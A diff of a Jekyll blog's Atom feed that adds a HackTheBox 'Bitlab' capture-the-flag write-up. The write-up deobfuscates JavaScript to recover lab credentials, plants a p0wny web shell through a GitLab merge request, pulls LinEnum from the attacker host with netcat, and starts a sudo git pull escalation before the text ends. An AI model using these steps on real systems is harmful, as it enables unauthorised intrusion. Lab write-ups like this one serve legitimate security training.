@@ -1,20 +1,168 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://sradley.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://sradley.github.io/" rel="alternate" type="text/html" /><updated>2020-12-26T00:11:04+08:00</updated><id>https://sradley.github.io/feed.xml</id><title type="html">sradley</title><entry><title type="html">Welcome to Jekyll!</title><link href="https://sradley.github.io/jekyll/update/2020/12/25/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2020-12-25T23:13:56+08:00</published><updated>2020-12-25T23:13:56+08:00</updated><id>https://sradley.github.io/jekyll/update/2020/12/25/welcome-to-jekyll</id><content type="html" xml:base="https://sradley.github.io/jekyll/update/2020/12/25/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://sradley.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://sradley.github.io/" rel="alternate" type="text/html" /><updated>2020-12-26T00:27:40+08:00</updated><id>https://sradley.github.io/feed.xml</id><title type="html">sradley</title><entry><title type="html">HackTheBox :: Bitlab</title><link href="https://sradley.github.io/writeups/2020/12/25/htb-bitlab.html" rel="alternate" type="text/html" title="HackTheBox :: Bitlab" /><published>2020-12-25T00:00:00+08:00</published><updated>2020-12-25T00:00:00+08:00</updated><id>https://sradley.github.io/writeups/2020/12/25/htb-bitlab</id><content type="html" xml:base="https://sradley.github.io/writeups/2020/12/25/htb-bitlab.html">&lt;h1 id=&quot;hackthebox--bitlab&quot;&gt;HackTheBox :: Bitlab&lt;/h1&gt;
 
-&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;
+&lt;h2 id=&quot;initial-enumeration&quot;&gt;Initial Enumeration&lt;/h2&gt;
+&lt;p&gt;Let’s start with our usual nmap scan.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nmap -sCSV -p 1-10000 10.10.10.114
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-01 15:11 AEDT
+Nmap scan report for 10.10.10.114
+Host is up (0.057s latency).
+Not shown: 9998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
+|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
+|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
+80/tcp open  http    nginx
+| http-robots.txt: 55 disallowed entries (15 shown)
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in \xC2\xB7 GitLab
+|_Requested resource was http://10.10.10.114/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Nothing too interesting here, apart from the fact that the HTTP server is running Gitlab. Seems like this might be another code-review box, nice. No obvious ways in, so let’s fire up burpsuite and see if its spider picks up anything interesting.&lt;/p&gt;
 
-&lt;p&gt;Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+&lt;p&gt;So after about 30 seconds of clicking on links we land on an interesting one. The “help” link leads us to an open directory, with an interesting “bookmarks.html” file. Let’s take a look.&lt;/p&gt;
 
-&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;
+&lt;p&gt;Hmm, it just seems to be a bunch of links. However, while most of the links go to outside URLs, the “Gitlab Login” link is interesting. It seems to be some poorly obfuscated javascript. So let’s copy this javascript, clean it up a little and see what we can extract from it.&lt;/p&gt;
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x4b18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x76&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x6C&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x75&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x65&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x75&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x72&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x5F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x6C&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x6F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x67&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x69&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x6E&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x67&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x45&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x6C&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x6D&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x6E&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x42&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x79&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x49&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x64&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x63&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x6C&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x76&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x65&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x75&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/x72&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x5F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x70&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x6F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x72&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x64&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x64&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x38&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x78&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4b18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4b18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4b18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x4b18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4b18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4b18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4b18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x4b18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;})()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">HackTheBox :: Bitlab</title><link href="https://sradley.github.io/writeups/2020/12/25/htb-bitlab.html" rel="alternate" type="text/html" title="HackTheBox :: Bitlab" /><published>2020-12-25T00:00:00+08:00</published><updated>2020-12-25T00:00:00+08:00</updated><id>https://sradley.github.io/writeups/2020/12/25/htb-bitlab</id><content type="html" xml:base="https://sradley.github.io/writeups/2020/12/25/htb-bitlab.html"></content><author><name></name></author><category term="writeups" /><summary type="html"></summary></entry><entry><title type="html">HackTheBox :: Craft</title><link href="https://sradley.github.io/writeups/2020/12/25/htb-craft.html" rel="alternate" type="text/html" title="HackTheBox :: Craft" /><published>2020-12-25T00:00:00+08:00</published><updated>2020-12-25T00:00:00+08:00</updated><id>https://sradley.github.io/writeups/2020/12/25/htb-craft</id><content type="html" xml:base="https://sradley.github.io/writeups/2020/12/25/htb-craft.html">&lt;h1 id=&quot;hackthebox--craft&quot;&gt;HackTheBox :: Craft&lt;/h1&gt;
+&lt;p&gt;So, the first thing that should jump out at you when looking at this should be the hex. Based on the range of characters it looks like valid ascii. So let’s get decoding. We’ll should also rename the array so it’s a bit more readable, and take the variables out of the array in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;document&lt;/code&gt; statements at the bottom.&lt;/p&gt;
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;user_login&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;clave&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;user_password&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11des0081x&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;user_login&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;clave&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;user_password&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11des0081x&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nice. It’s pretty obvious this is some sort of hacky login script that this dude “clave” wrote. Let’s cut out all the crap so the javascript is readable (an unnecessary step, but indulge me).&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function() {
+    document.getElementById(&quot;user_login&quot;).value = &quot;clave&quot;;
+    document.getElementById(&quot;user_password&quot;).value = &quot;11des0081x&quot;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Awesome, now that we have some credentials we should use them. They’re definitely for the gitlab login page. Let’s give them a go and see what we can see.&lt;/p&gt;
+
+&lt;p&gt;Okay, so it seems like “clave” has access to two repositories, “Profile” and “Deployer”. Let’s give both of these a good read (commits, issues, pull requests, source code, etc) and see if we can’t find anything interesting.&lt;/p&gt;
+
+&lt;p&gt;So “Profile” is completely uninteresting apart from the fact that it has “Auto DevOps” enabled. “Deployer” is very interesting. It seems to be a git hook for the “Profile” repo. It looks like whenever a successful merge request goes through on “Profile”, the updated “Profile” repo is pulled onto the server. So I think our first step should be finding where the profile page is located on the server. What’s the bet that it’s just at “/profile”?&lt;/p&gt;
+
+&lt;p&gt;Yup, that worked. Let’s see if can get a shell uploaded. It should be as simple as uploading the shell to another branch on the “Profile” repo and submitting a merge request. Let’s give this a go.&lt;/p&gt;
+
+&lt;p&gt;Shell successfully uploaded, merge request successful. Hopefully we should be able to see our shell in the profile directory. Yup, there it is.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;p0wny@shell:…/html/profile# whoami
+www-data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-user--root&quot;&gt;Getting User &amp;amp; Root&lt;/h2&gt;
+&lt;p&gt;Let’s upload our enumeration script and see what we can find.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;p0wny@shell:/tmp# nc 10.10.xx.xx 4444 &amp;gt; LinEnum.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -lv -p 4444 &amp;lt; LinEnum.sh
+listening on [any] 4444 ...
+connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 49978
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;p0wny@shell:/tmp# sh LinEnum.sh
+
+...
+
+-e [-] Super user account(s):
+root
+-e
+
+...
+
+User www-data may run the following commands on bitlab:
+    (root) NOPASSWD: /usr/bin/git pull
+
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Huh, so it seems we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git pull&lt;/code&gt; as sudo. We can leverage this, but it’ll be a little weird. I hope you’re familiar with git. I don’t want to go into too much detail as to how this exploit works, but I’ll give you an overview.&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;You need to create two repositories: one is the remote (the “master”) repository, and one is the “local” repository.&lt;/li&gt;
+  &lt;li&gt;You set the remote of the “local” repo to be the “master” repo you created earlier.&lt;/li&gt;
